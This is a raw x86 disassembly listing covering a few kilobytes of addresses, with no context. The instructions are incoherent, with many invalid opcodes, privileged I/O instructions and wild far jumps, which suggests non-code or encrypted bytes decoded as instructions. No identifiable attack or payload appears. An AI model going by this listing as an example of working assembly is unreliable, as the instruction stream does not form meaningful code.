  42260d:	pop    edi
  42260e:	ffree  st(2)
  422610:	mov    ds:0x7be56588,eax
  422615:	into   
  422616:	dec    esi
  422617:	dec    eax
  422618:	and    eax,0xcc4bc371
  42261d:	cmp    BYTE PTR [esi-0x2ff608b6],ch
  422623:	not    DWORD PTR [ebx-0x253cbcf9]
  422629:	mov    bl,0xda
  42262b:	or     esp,DWORD PTR [eax]
  42262d:	bound  ebp,QWORD PTR ds:0x5394d48b
  422633:	sbb    DWORD PTR [eax+0x27],esi
  422636:	das    
  422637:	sub    esp,DWORD PTR [eax-0x42ae1a91]
  42263d:	pop    esi
  42263e:	jmp    0xeed5cbdc
  422643:	sbb    BYTE PTR [esi-0x9],ch
  422646:	xchg   DWORD PTR [esp+ecx*2-0x6e2ccff1],ebp
  42264d:	jge    0x4225e3
  42264f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422650:	hlt    
  422651:	add    al,0x6a
  422653:	cdq    
  422654:	push   ss
  422655:	lds    esp,FWORD PTR [edi-0x2c]
  422658:	xchg   edx,eax
  422659:	mov    DWORD PTR [edi+0x57],ecx
  42265c:	add    eax,0xbbe29230
  422661:	sub    esi,DWORD PTR [esi+0x2a]
  422664:	sub    ch,BYTE PTR [ecx+ecx*4+0x7f]
  422668:	fnstsw WORD PTR [edx+0x7e]
  42266b:	es cwde 
  42266d:	ins    BYTE PTR es:[edi],dx
  42266e:	mov    eax,0x3427d5c2
  422673:	cld    
  422674:	es mov eax,0xfcf76f77
  42267a:	imul   BYTE PTR [esi-0x75]
  42267d:	enter  0x946b,0x68
  422681:	in     eax,0x84
  422683:	or     ecx,DWORD PTR [ecx-0x661bfb00]
  422689:	dec    edi
  42268a:	fcmovnb st,st(2)
  42268c:	jmp    0x8eee:0xd63af35a
  422693:	dec    edi
  422694:	loope  0x422659
  422696:	ss cmp bl,dh
  422699:	xor    edx,edx
  42269b:	push   0xffffffef
  42269d:	bswap  edi
  42269f:	push   ds
  4226a0:	mov    edi,esp
  4226a2:	ret    
  4226a3:	fsub   DWORD PTR [ebp+0x25d2add0]
  4226a9:	(bad)  
  4226aa:	cld    
  4226ab:	ja     0x42266f
  4226ad:	pop    ss
  4226ae:	loop   0x42268f
  4226b0:	(bad)  
  4226b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b3:	mov    esp,0x5d258e0e
  4226b8:	mov    cl,0x51
  4226ba:	jno    0x422659
  4226bc:	xlat   BYTE PTR ds:[ebx]
  4226bd:	dec    eax
  4226be:	out    dx,eax
  4226bf:	das    
  4226c0:	sbb    ah,BYTE PTR [ecx]
  4226c2:	jmp    0x42268a
  4226c4:	call   0x411a518
  4226c9:	jp     0x4226a8
  4226cb:	rcl    DWORD PTR [eax-0x10b91cc],0x57
  4226d2:	in     eax,dx
  4226d3:	pop    eax
  4226d4:	call   0xae99:0x99362a53
  4226db:	test   eax,0xd76ff6dd
  4226e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226e1:	push   cs
  4226e2:	pop    ecx
  4226e3:	mov    eax,ds:0x73a884ba
  4226e8:	sub    cl,BYTE PTR [edx]
  4226ea:	mov    BYTE PTR [edx],dh
  4226ec:	out    0x75,al
  4226ee:	cld    
  4226ef:	pop    es
  4226f0:	mov    al,ds:0xd12e2b66
  4226f5:	repnz daa 
  4226f7:	jno    0x422694
  4226f9:	fwait
  4226fa:	mov    esi,0x6dbaf4d9
  4226ff:	cwde   
  422700:	xor    DWORD PTR [eax-0x1c],eax
  422703:	test   BYTE PTR [ebx+0x26],bl
  422706:	rcl    BYTE PTR [ebp-0x1cd3af],1
  42270c:	hlt    
  42270d:	dec    edx
  42270e:	cli    
  42270f:	mov    BYTE PTR [eax],dl
  422711:	(bad)  
  422712:	fidiv  WORD PTR [ebx+0x17]
  422715:	cdq    
  422716:	and    eax,0xedeaf871
  42271b:	std    
  42271c:	(bad)  
  42271d:	cmp    ah,BYTE PTR [ecx+0x19]
  422720:	xor    al,0x9a
  422722:	sbb    eax,0xa9bff87c
  422727:	add    BYTE PTR ds:0x81d21692,cl
  42272d:	je     0x4226e0
  42272f:	jns    0x422740
  422731:	rcl    DWORD PTR [ebx+ebp*8],0x13
  422735:	xchg   esp,eax
  422736:	push   esi
  422737:	seto   ah
  42273a:	cdq    
  42273b:	hlt    
  42273c:	call   0xcf82:0x317c8301
  422743:	aas    
  422744:	out    dx,eax
  422745:	pop    edi
  422746:	mov    eax,ds:0x7411bac8
  42274b:	in     al,dx
  42274c:	inc    eax
  42274d:	and    eax,0x896b3229
  422752:	mov    ds:0x900a7bc,eax
  422757:	adc    edi,DWORD PTR ds:0x8f7ed66c
  42275d:	jmp    0x422709
  42275f:	(bad)  
  422761:	scas   al,BYTE PTR es:[edi]
  422762:	mov    ds:0x3dfcb68,eax
  422767:	nop
  422768:	addr16 sbb eax,0x44c0d783
  42276e:	ja     0x42273c
  422770:	fsub   QWORD PTR [edx+eax*8-0x1c]
  422774:	ror    BYTE PTR [ebp-0x4a],cl
  422777:	adc    cl,BYTE PTR [ebx+eax*2+0xf343880]
  42277e:	adc    BYTE PTR [edi-0x1565e528],al
  422784:	sub    cl,BYTE PTR [ebx-0x64]
  422787:	daa    
  422788:	cmp    eax,DWORD PTR ds:0xc2d673ed
  42278e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42278f:	retf   0x5d48
  422792:	int    0xb6
  422794:	push   eax
  422795:	lock or DWORD PTR [ebp+ebx*8-0xa],ebp
  42279a:	mov    bl,0xb3
  42279c:	les    eax,FWORD PTR [ebp-0x1d]
  42279f:	out    dx,eax
  4227a0:	stos   DWORD PTR es:[edi],eax
  4227a1:	in     eax,dx
  4227a2:	inc    ebx
  4227a3:	dec    ecx
	...
  4227b0:	add    BYTE PTR [edi+0x75],ah
  4227b3:	int3   
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	les    esp,FWORD PTR [eax-0x5f8e6ff4]
  4227c3:	add    DWORD PTR [eax],eax
  4227c5:	stos   DWORD PTR es:[edi],eax
  4227c6:	add    eax,DWORD PTR [eax]
  4227c8:	add    BYTE PTR [edi+0x7],dl
  4227cb:	mov    ah,0x81
  4227cd:	in     al,0x70
  4227cf:	call   0x80df6c09
  4227d4:	xor    DWORD PTR [edx+0x6d711189],edi
  4227da:	je     0x422786
  4227dc:	or     al,0x56
  4227de:	mov    eax,0x11ca8865
  4227e3:	inc    ebx
  4227e4:	xchg   esp,eax
  4227e6:	inc    esi
  4227e7:	sub    al,0xb8
  4227e9:	fidiv  DWORD PTR [edx+0x25ac2747]
  4227ef:	xchg   ebp,eax
  4227f0:	test   al,0x66
  4227f2:	inc    eax
  4227f3:	mov    eax,0xce896ce
  4227f8:	(bad)  
  4227fb:	retf   0x5c93
  4227fe:	outs   dx,DWORD PTR ds:[esi]
  4227ff:	push   0x1282b09
  422804:	neg    BYTE PTR gs:[edx-0x6b]
  422808:	hlt    
  422809:	fnstsw WORD PTR [esi+0xa]
  42280c:	push   0x4294355e
  422811:	idiv   ah
  422813:	cdq    
  422814:	les    esi,FWORD PTR [edx-0x293eecfa]
  42281a:	push   ebp
  42281b:	pop    eax
  42281c:	mov    esi,0xfd0016f6
  422821:	push   ds
  422822:	or     eax,0x7bed3123
  422827:	jp     0x4228a8
  422829:	clc    
  42282a:	pop    eax
  42282b:	in     eax,0xa9
  42282d:	xor    BYTE PTR [ecx-0x3c],0x2f
  422831:	mov    dh,0xf2
  422833:	sahf   
  422834:	jp     0x4227f8
  422836:	jecxz  0x422882
  422838:	mov    dh,0x32
  42283a:	xor    al,0x3b
  42283c:	es or  ebx,ecx
  42283f:	pop    ebx
  422840:	jnp    0x42284f
  422842:	sar    BYTE PTR [esi],1
  422844:	js     0x4228c1
  422846:	shr    bl,1
  422848:	push   ebx
  422849:	pop    edx
  42284a:	cmp    BYTE PTR [eax+0x60],0x5a
  42284e:	cmp    BYTE PTR [eax+0x7ef65cd0],bh
  422854:	sar    DWORD PTR [ecx-0x3e],cl
  422857:	mov    edx,0x798c892a
  42285c:	cmp    BYTE PTR [eax-0x11c38dc9],bl
  422862:	imul   eax,eax,0x4f
  422865:	sbb    al,0x85
  422867:	retf   0x879e
  42286a:	fstp   TBYTE PTR ds:0x2330470b
  422870:	mov    ecx,0x8b5ffab
  422875:	mov    ebx,0x2523c6a0
  42287a:	sbb    BYTE PTR [esi],bh
  42287c:	xchg   esi,eax
  42287d:	out    0x78,eax
  42287f:	shl    dh,0x54
  422882:	enter  0xa850,0x83
  422886:	push   ebp
  422887:	inc    edi
  422888:	mov    dl,0xd3
  42288a:	push   ss
  42288b:	or     BYTE PTR [ecx-0x660b89c4],ah
  422891:	and    edi,DWORD PTR [edi-0x6edda015]
  422897:	and    BYTE PTR [eax],0x64
  42289a:	xchg   ebp,eax
  42289b:	and    eax,0x6093a0a8
  4228a0:	add    edi,ebp
  4228a2:	sub    esi,DWORD PTR [eax+0x69]
  4228a5:	sub    dh,bl
  4228a7:	stc    
  4228a8:	mov    dh,BYTE PTR [esi+0x768aa582]
  4228ae:	fist   WORD PTR [ebx]
  4228b0:	add    cl,0x90
  4228b3:	sub    al,0x32
  4228b5:	sbb    DWORD PTR [edi-0x155d82b1],0xffffffe1
  4228bc:	stc    
  4228bd:	mov    al,0xd5
  4228bf:	mov    bl,0x32
  4228c1:	jnp    0x422930
  4228c3:	(bad)  
  4228c4:	dec    ecx
  4228c5:	ins    DWORD PTR es:[edi],dx
  4228c6:	jnp    0x4228dc
  4228c8:	jle    0x422902
  4228ca:	xchg   esp,eax
  4228cb:	sahf   
  4228cc:	jle    0x422855
  4228ce:	mov    bh,0xaf
  4228d0:	jl     0x42288b
  4228d2:	and    al,0x39
  4228d4:	mov    cl,0xd8
  4228d6:	dec    ecx
  4228d7:	sti    
  4228d8:	fwait
  4228d9:	sub    dl,dh
  4228db:	cli    
  4228dc:	ret    
  4228dd:	test   al,0x30
  4228df:	sub    DWORD PTR [ecx],edx
  4228e1:	arpl   WORD PTR [eax],cx
  4228e3:	xchg   ebp,eax
  4228e4:	adc    cl,al
  4228e6:	pop    ss
  4228e7:	xchg   ebp,eax
  4228e8:	jns    0x4228a3
  4228ea:	push   cs
  4228eb:	aam    0x25
  4228ed:	jae    0x422927
  4228ef:	call   ebx
  4228f1:	adc    dh,BYTE PTR [ecx-0x3db6d686]
  4228f7:	sub    al,0xc1
  4228f9:	dec    eax
  4228fa:	pop    es
  4228fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228fc:	lds    esp,FWORD PTR [eax-0x4a80e28b]
  422902:	mov    edx,edi
  422904:	xor    ebx,DWORD PTR [ebx+0x2016099e]
  42290a:	mov    ss,WORD PTR [ebp-0x41]
  42290d:	mov    al,ds:0xbf64e011
  422912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422913:	pusha  
  422914:	mov    ch,0x45
  422916:	xchg   al,bl
  422918:	cmp    ecx,DWORD PTR [edx]
  42291a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291b:	out    0x78,eax
  42291d:	mov    ebx,0xa5819012
  422922:	and    dl,BYTE PTR [edi-0x63]
  422925:	pop    esi
  422926:	sbb    al,BYTE PTR [eax]
  422928:	or     BYTE PTR [ebx+0x591ceacf],cl
  42292e:	dec    esp
  42292f:	ja     0x422929
  422931:	ja     0x422991
  422933:	or     BYTE PTR [ebp+0x437034cd],0x4a
  42293a:	jecxz  0x422919
  42293c:	push   ds
  42293d:	ja     0x4229a0
  42293f:	ins    BYTE PTR es:[edi],dx
  422940:	enter  0x939c,0x82
  422944:	push   ebp
  422945:	xchg   ebp,eax
  422946:	jmp    0x4228fb
  422948:	loopne 0x4228f8
  42294a:	call   0x5948:0xb35ee0d5
  422951:	and    DWORD PTR [edi+edi*1],0xfd0bd5aa
  422958:	mov    eax,ds:0x30ef6e97
  42295d:	aas    
  42295e:	xor    eax,0xae4d9aca
  422963:	cwde   
  422964:	ror    BYTE PTR [edx-0x56],cl
  422967:	mov    ah,0x23
  422969:	rcl    BYTE PTR [eax],0x80
  42296c:	imul   edx,DWORD PTR [ebx-0x4d],0x9
  422970:	push   ds
  422971:	xor    BYTE PTR [ecx-0x71],ch
  422974:	(bad)  
  422975:	xchg   esp,eax
  422976:	push   ecx
  422977:	mov    al,ds:0x4b663ff3
  42297c:	mov    eax,0xeea204c
  422981:	test   BYTE PTR [eax+0x5a2c4680],ah
  422987:	add    ah,ah
  422989:	retf   0x2d8c
  42298c:	jb     0x4229dd
  42298e:	and    eax,0x4d45e773
  422993:	inc    ecx
  422994:	retf   
  422995:	(bad)  
  422996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422997:	gs jne 0x4229d3
  42299a:	movq   mm3,QWORD PTR [ecx]
  42299d:	cmp    esp,DWORD PTR [ebp-0x45]
  4229a0:	test   DWORD PTR [edi+0x6a],ebp
  4229a3:	and    BYTE PTR [esi+0x7c],dh
  4229a6:	(bad)  
  4229a8:	les    esi,FWORD PTR [edi+0x49c324b7]
  4229ae:	mov    al,ds:0xe608a26a
  4229b3:	outs   dx,DWORD PTR ds:[esi]
  4229b4:	mov    edi,es
  4229b6:	push   ecx
  4229b7:	xchg   esp,eax
  4229b8:	cwde   
  4229b9:	loope  0x422945
  4229bb:	xor    bl,0xdd
  4229be:	inc    ebp
  4229bf:	lea    esp,[esi-0x45]
  4229c2:	inc    edx
  4229c3:	popf   
  4229c4:	push   cs
  4229c5:	mov    edi,DWORD PTR [edi-0x794f2cfe]
  4229cb:	jb     0x42299c
  4229cd:	les    eax,FWORD PTR [ecx]
  4229cf:	cmp    DWORD PTR [edi-0x53],0x67cbf64
  4229d6:	pop    eax
  4229d7:	adc    dh,ch
  4229d9:	push   edi
  4229da:	sbb    eax,0xb79f91d
  4229df:	sub    al,0x25
  4229e1:	pop    ecx
  4229e2:	imul   ecx,edi,0xf85aa079
  4229e8:	mov    WORD PTR [edi+0x4925f5f3],?
  4229ee:	adc    al,0x85
  4229f0:	mov    ah,0xa
  4229f2:	mov    bl,0xa2
  4229f4:	leave  
  4229f5:	aaa    
  4229f6:	dec    eax
  4229f7:	adc    BYTE PTR [eax-0x27],dl
  4229fa:	adc    DWORD PTR [ebx+0x70],ebp
  4229fd:	int    0x9b
  4229ff:	repz ror DWORD PTR ds:0x511b4544,cl
  422a06:	(bad)  
  422a08:	fidiv  DWORD PTR [ebx+0x63]
  422a0b:	clc    
  422a0c:	pop    edi
  422a0d:	adc    al,0x90
  422a0f:	or     eax,0xce207ee3
  422a14:	xor    eax,0x59bdac19
  422a19:	outs   dx,DWORD PTR ds:[esi]
  422a1a:	and    DWORD PTR [ebp-0x74],edi
  422a1d:	ins    BYTE PTR es:[edi],dx
  422a1e:	out    0xe,al
  422a20:	adc    DWORD PTR [ebx+0x2a],0xffffffa0
  422a24:	cdq    
  422a25:	inc    ecx
  422a26:	mov    DWORD PTR [edx+0x27dc1411],ebx
  422a2c:	ficomp WORD PTR [ebx+0x3e308c55]
  422a32:	inc    esp
  422a33:	outs   dx,DWORD PTR ds:[esi]
  422a34:	sbb    BYTE PTR [esi-0x72],dl
  422a37:	test   BYTE PTR [ecx-0x42],cl
  422a3a:	jge    0x422a3e
  422a3c:	(bad)  
  422a3d:	push   eax
  422a3e:	clc    
  422a3f:	loop   0x422a9a
  422a41:	je     0x422a81
  422a43:	mov    DWORD PTR [eax-0x20],esp
  422a46:	inc    ebp
  422a47:	pop    edx
  422a48:	out    dx,al
  422a49:	xlat   BYTE PTR ds:[ebx]
  422a4a:	push   esi
  422a4b:	div    ebp
  422a4d:	sbb    al,0xb0
  422a4f:	cli    
  422a50:	mov    ecx,0x410bf07c
  422a55:	mov    bh,0xd
  422a57:	cmp    dl,BYTE PTR [esi-0x6a0b6caf]
  422a5d:	shl    BYTE PTR [edi-0x6434ab1c],cl
  422a63:	cmp    DWORD PTR [edx],edx
  422a65:	sbb    eax,0x15770544
  422a6a:	jge    0x422a87
  422a6c:	cmp    eax,0x32d51ddd
  422a71:	dec    ebp
  422a72:	sub    BYTE PTR gs:[esi+0x47e7d544],0xad
  422a7a:	add    DWORD PTR [eax],eax
  422a7c:	test   eax,0x6f10851b
  422a81:	fldenv [ebp+0x5e]
  422a84:	inc    ecx
  422a85:	or     eax,0x695e986b
  422a8a:	jbe    0x422aad
  422a8c:	jmp    0xb49229e4
  422a91:	jbe    0x422a64
  422a93:	inc    eax
  422a94:	or     ch,BYTE PTR [esi+eiz*1-0x5b]
  422a98:	(bad)  
  422a99:	xchg   esp,eax
  422a9a:	mov    cl,0x3
  422a9c:	aad    0xee
  422a9e:	in     al,dx
  422a9f:	std    
  422aa0:	mov    ecx,0xeb718e17
  422aa5:	ins    DWORD PTR es:[edi],dx
  422aa6:	sbb    BYTE PTR [eax+0x40],cl
  422aa9:	inc    esi
  422aaa:	shl    BYTE PTR [eax+0x6b],cl
  422aad:	sub    esi,DWORD PTR [edx]
  422aaf:	call   0xa87a9866
  422ab4:	ret    
  422ab5:	push   edx
  422ab6:	inc    ecx
  422ab7:	(bad)  
  422ab8:	mov    ah,0xf1
  422aba:	push   eax
  422abb:	aas    
  422abc:	jmp    0x422aa8
  422abe:	adc    DWORD PTR [esi],esi
  422ac0:	inc    DWORD PTR [edi]
  422ac2:	sub    dl,bl
  422ac4:	jge    0x422b29
  422ac6:	add    esi,DWORD PTR [edi+0x179ebeb9]
  422acc:	push   0xcd980d7
  422ad1:	pop    esp
  422ad2:	and    al,0x30
  422ad4:	sbb    DWORD PTR [eax],esp
  422ad6:	push   0xc5664feb
  422adb:	add    ebx,ebp
  422add:	inc    esi
  422ade:	adc    eax,0xbfca98b5
  422ae3:	es das 
  422ae5:	mov    ah,0x87
  422ae7:	retf   0x2971
  422aea:	mov    ds:0xa3e31335,al
  422aef:	ja     0x422b3a
  422af1:	sti    
  422af2:	jbe    0x422b58
  422af4:	stos   DWORD PTR es:[edi],eax
  422af5:	push   ebp
  422af6:	pop    eax
  422af7:	xor    BYTE PTR [eax],bl
  422af9:	(bad)  
  422afa:	scas   eax,DWORD PTR es:[edi]
  422afb:	fs aas 
  422afd:	scas   eax,DWORD PTR es:[edi]
  422afe:	iret   
  422aff:	scas   eax,DWORD PTR es:[edi]
  422b00:	xchg   dh,cl
  422b02:	jns    0x422b21
  422b04:	pop    eax
  422b05:	(bad)  
  422b07:	adc    DWORD PTR [eax-0x37804fd7],esp
  422b0d:	dec    esp
  422b0e:	push   ebx
  422b0f:	loop   0x422b7e
  422b11:	xchg   BYTE PTR ds:0x482adcbc,bh
  422b17:	mov    al,al
  422b19:	inc    edi
  422b1a:	dec    ebx
  422b1b:	xor    dl,BYTE PTR [edx-0x5b]
  422b1e:	mov    WORD PTR [edx+esi*4-0x7270a56d],ss
  422b25:	sbb    al,0x49
  422b27:	xchg   BYTE PTR [edi],dh
  422b29:	lea    edx,[eax+0x1f]
  422b2c:	mov    cl,0x70
  422b2e:	(bad)  
  422b2f:	jp     0x422b56
  422b31:	dec    esi
  422b32:	iret   
  422b33:	mov    edx,0xca61a0d9
  422b38:	push   ds
  422b39:	sbb    ebx,DWORD PTR [esi-0x49]
  422b3c:	(bad)
  422b40:	mov    WORD PTR [edx+0x12],es
  422b43:	lods   al,BYTE PTR ds:[esi]
  422b44:	loope  0x422b41
  422b46:	cli    
  422b47:	mov    cl,BYTE PTR [esi]
  422b49:	mov    ch,0xd7
  422b4b:	mov    ecx,0x32a5ac19
  422b50:	push   esi
  422b51:	push   0x79f0f2c1
  422b56:	mov    dl,0x3f
  422b58:	pop    ss
  422b59:	pushf  
  422b5a:	mov    al,0xb4
  422b5c:	ret    
  422b5d:	inc    edi
  422b5e:	push   ebx
  422b5f:	cmp    al,0x76
  422b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b62:	cmp    eax,0xda9439e5
  422b67:	ret    0x9818
  422b6a:	lods   eax,DWORD PTR ds:[esi]
  422b6b:	inc    edx
  422b6c:	dec    ebp
  422b6d:	mov    bh,0x97
  422b6f:	loope  0x422baa
  422b71:	iret   
  422b72:	xchg   ebx,eax
  422b73:	mov    BYTE PTR [eax],0x0
	...
  422b7e:	add    BYTE PTR [eax],al
  422b80:	add    BYTE PTR [eax-0x43f64bd4],ah
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    ah,BYTE PTR [ebx]
  422b8e:	ins    DWORD PTR es:[edi],dx
  422b8f:	sub    eax,0x1a41c71
  422b94:	add    BYTE PTR [ebx+0x48000003],ch
  422b9a:	ins    DWORD PTR es:[edi],dx
  422b9b:	adc    DWORD PTR [esi-0x3ebf75c2],edx
  422ba1:	pushf  
  422ba2:	dec    ebx
  422ba3:	out    dx,eax
  422ba4:	dec    edi
  422ba5:	fld    QWORD PTR [eax+0x2c1e5e84]
  422bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bac:	mov    eax,0xd0a74c5b
  422bb1:	sub    esp,DWORD PTR [edx-0x69]
  422bb4:	lahf   
  422bb5:	xchg   edx,eax
  422bb6:	es stc 
  422bb8:	or     al,0xdd
  422bba:	or     esp,DWORD PTR [ebx]
  422bbc:	push   0xc7cf1375
  422bc1:	pop    edi
  422bc2:	and    esp,DWORD PTR [ecx+0x3]
  422bc5:	xor    eax,esi
  422bc7:	pusha  
  422bc8:	sub    DWORD PTR [ebx],eax
  422bca:	je     0x422bad
  422bcc:	fidiv  DWORD PTR [ebp-0x3bf36a65]
  422bd2:	xchg   ebp,eax
  422bd3:	xchg   edi,eax
  422bd4:	and    al,ch
  422bd6:	sub    esi,DWORD PTR [ecx]
  422bd8:	push   edi
  422bd9:	(bad)  
  422bda:	out    dx,al
  422bdb:	call   0xad95:0xa2f89a55
  422be2:	inc    esi
  422be3:	js     0x422b92
  422be5:	push   0x37a9e795
  422bea:	xor    BYTE PTR [edx],cl
  422bec:	cwde   
  422bed:	sbb    bh,BYTE PTR [ebp+0x298460e3]
  422bf3:	jae    0x422c27
  422bf5:	adc    ecx,esp
  422bf7:	pop    esp
  422bf8:	xor    edx,esi
  422bfa:	jno    0x422c25
  422bfc:	out    0xd7,al
  422bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bff:	mov    ds:0x981dc7ed,al
  422c04:	icebp  
  422c05:	fcmovu st,st(2)
  422c07:	xlat   BYTE PTR ds:[ebx]
  422c08:	nop
  422c09:	cdq    
  422c0a:	ret    
  422c0b:	and    ecx,eax
  422c0d:	add    DWORD PTR [edi],ebp
  422c0f:	js     0x422c6f
  422c11:	cmp    al,0x64
  422c13:	xlat   BYTE PTR ds:[ebx]
  422c14:	jmp    0x6bf0:0xe22f29fe
  422c1b:	mov    eax,0x38aee45c
  422c21:	dec    eax
  422c22:	push   edi
  422c23:	or     edi,DWORD PTR [eax+0x1750cb3f]
  422c29:	jg     0x422beb
  422c2b:	cmc    
  422c2c:	sti    
  422c2d:	fist   WORD PTR [eax]
  422c2f:	popa   
  422c30:	mov    esi,0x3ea5a785
  422c35:	inc    ecx
  422c36:	icebp  
  422c37:	lods   eax,DWORD PTR ds:[esi]
  422c38:	xchg   BYTE PTR [ecx],ch
  422c3a:	cdq    
  422c3b:	pop    ebx
  422c3c:	xchg   edx,eax
  422c3d:	scas   eax,DWORD PTR es:[edi]
  422c3e:	pop    ecx
  422c3f:	pop    eax
  422c40:	dec    esi
  422c41:	and    al,0xbe
  422c43:	xchg   DWORD PTR [ebx+edx*4],esi
  422c46:	xchg   edx,eax
  422c47:	push   es
  422c48:	jo     0x422c6d
  422c4a:	aas    
  422c4b:	pop    eax
  422c4c:	fmulp  st(4),st
  422c4e:	not    DWORD PTR [edx-0x8bded66]
  422c54:	xchg   esi,eax
  422c55:	mov    edi,0x15371862
  422c5a:	mov    ch,0xa6
  422c5c:	cmc    
  422c5d:	psraw  mm1,QWORD PTR [eax-0x35ecf4a6]
  422c64:	or     DWORD PTR [ecx-0x127a74f4],esi
  422c6a:	jmp    0x422c76
  422c6c:	mov    ds,WORD PTR fs:[ebx-0x1dcb7957]
  422c73:	push   esp
  422c74:	dec    ebx
  422c75:	push   0x52
  422c77:	and    eax,edi
  422c79:	retf   
  422c7a:	outs   dx,BYTE PTR ds:[esi]
  422c7b:	jbe    0x422c82
  422c7d:	pop    esi
  422c7e:	xchg   edx,eax
  422c7f:	sub    eax,0xabc6ea3c
  422c84:	fmul   QWORD PTR [ebx-0x3886f549]
  422c8a:	adc    DWORD PTR [ecx-0x7d],ecx
  422c8d:	pop    ebp
  422c8e:	xchg   DWORD PTR [edx],ecx
  422c90:	and    DWORD PTR [edx-0x1b],edx
  422c93:	and    bh,al
  422c95:	jmp    0xd35a47ac
  422c9a:	mov    ebx,0xc499804c
  422c9f:	fidivr WORD PTR [ebx]
  422ca1:	dec    edx
  422ca2:	push   esp
  422ca3:	xchg   ecx,eax
  422ca4:	repnz push ebx
  422ca6:	sbb    ch,BYTE PTR [esi+0x7f3a6ee2]
  422cac:	cdq    
  422cad:	ja     0x422d1c
  422caf:	test   eax,0xb625e79
  422cb4:	aaa    
  422cb5:	xchg   ebx,eax
  422cb6:	fadd   QWORD PTR [ebp+0x3b1c3887]
  422cbc:	dec    esi
  422cbd:	leave  
  422cbe:	stos   DWORD PTR es:[edi],eax
  422cbf:	mov    ebx,fs
  422cc1:	jg     0x422c4b
  422cc3:	fdiv   st(4),st
  422cc5:	aaa    
  422cc6:	sbb    DWORD PTR [eax+ebx*4-0x75c4d23],edx
  422ccd:	sbb    al,0x58
  422ccf:	and    edi,DWORD PTR [ebp-0x44]
  422cd2:	jns    0x422c94
  422cd4:	cld    
  422cd5:	retf   0x7ba9
  422cd8:	shr    DWORD PTR [esp+eax*2-0x6e],1
  422cdc:	ret    0x6835
  422cdf:	int3   
  422ce0:	xchg   esi,eax
  422ce1:	fs push ss
  422ce3:	push   ebx
  422ce4:	dec    edx
  422ce5:	push   cs
  422ce6:	push   edi
  422ce7:	daa    
  422ce8:	into   
  422ce9:	or     eax,0x7a
  422cec:	xor    BYTE PTR [esi+0x24],dh
  422cef:	je     0x422d36
  422cf1:	scas   al,BYTE PTR es:[edi]
  422cf2:	in     eax,dx
  422cf3:	jns    0x422cb5
  422cf5:	mov    ah,0xe1
  422cf7:	sub    DWORD PTR [ecx-0x53],esp
  422cfa:	retf   
  422cfb:	mov    ecx,0xb6ceb701
  422d00:	fnstenv [ebp+0x34]
  422d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d04:	pop    ds
  422d05:	inc    ecx
  422d06:	adc    eax,0x4046f627
  422d0b:	xor    DWORD PTR [edx+0xdd8daa8],eax
  422d11:	cdq    
  422d12:	(bad)  
  422d13:	mov    eax,0x42f58723
  422d18:	pop    esi
  422d19:	xchg   BYTE PTR [ecx],dl
  422d1b:	mov    ah,0x67
  422d1d:	add    eax,0xef50dddc
  422d22:	(bad)  
  422d23:	and    BYTE PTR [edi+0x1626e9c0],cl
  422d29:	pop    esi
  422d2a:	push   0x25
  422d2c:	retf   
  422d2d:	(bad)  
  422d2e:	cld    
  422d2f:	fcom   QWORD PTR [ecx]
  422d31:	pop    ds
  422d32:	pop    ebx
  422d33:	jns    0x422cfa
  422d35:	jbe    0x422d7c
  422d37:	fisubr DWORD PTR [ebx+0x1cd66e42]
  422d3d:	retf   0x41f8
  422d40:	or     eax,0x5239a1e5
  422d45:	cmp    al,0x9e
  422d47:	(bad)  
  422d48:	mov    ecx,0x833f1d29
  422d4d:	fidiv  WORD PTR [eax+eiz*2+0x34c61207]
  422d54:	jle    0x422d07
  422d56:	mov    bh,0xe4
  422d58:	fld    DWORD PTR [eax+ecx*4+0xa]
  422d5c:	push   0x781584b5
  422d61:	and    ebp,DWORD PTR [edx+0x75bf6bb1]
  422d67:	ja     0x422dbf
  422d69:	mov    al,ds:0xaecf3b56
  422d6e:	jmp    0x5776b312
  422d73:	jl     0x422d9f
  422d75:	clc    
  422d76:	rcr    cl,0xd0
  422d79:	es adc ecx,0x2
  422d7d:	mov    dh,0x78
  422d7f:	mov    esp,0x52dac9da
  422d84:	scas   al,BYTE PTR es:[edi]
  422d85:	mov    eax,ds:0x45f2cf49
  422d8a:	sahf   
  422d8b:	daa    
  422d8c:	dec    ebp
  422d8d:	cmp    esi,DWORD PTR [eax-0x6a]
  422d90:	aas    
  422d91:	dec    ecx
  422d92:	mov    al,ds:0xde4e3d74
  422d97:	mov    bl,0x7f
  422d99:	cmp    eax,0xf7827139
  422d9e:	adc    al,0x3b
  422da0:	jb     0x422d9e
  422da2:	mov    WORD PTR [eax-0x1d5df9f2],cs
  422da8:	xor    BYTE PTR [esi+0x6cee55ad],ch
  422dae:	sbb    DWORD PTR [eax+eax*8-0x41f4eedb],0xf5cc7c6f
  422db9:	sub    bl,dl
  422dbb:	xlat   BYTE PTR ds:[ebx]
  422dbc:	call   0x2c3ee4c7
  422dc1:	leave  
  422dc2:	aaa    
  422dc3:	pop    ebp
  422dc4:	(bad)  
  422dc5:	hlt    
  422dc6:	push   ebx
  422dc7:	cmp    al,0xe0
  422dc9:	outs   dx,BYTE PTR ds:[esi]
  422dca:	stos   DWORD PTR es:[edi],eax
  422dcb:	jge    0x422d4d
  422dcd:	push   ecx
  422dce:	cld    
  422dcf:	dec    ebx
  422dd0:	mov    al,0xa9
  422dd2:	(bad)  
  422dd3:	sti    
  422dd4:	scas   eax,DWORD PTR es:[edi]
  422dd5:	jns    0x422e4f
  422dd7:	sbb    al,0xf1
  422dd9:	and    DWORD PTR [eax-0xe],edi
  422ddc:	icebp  
  422ddd:	sti    
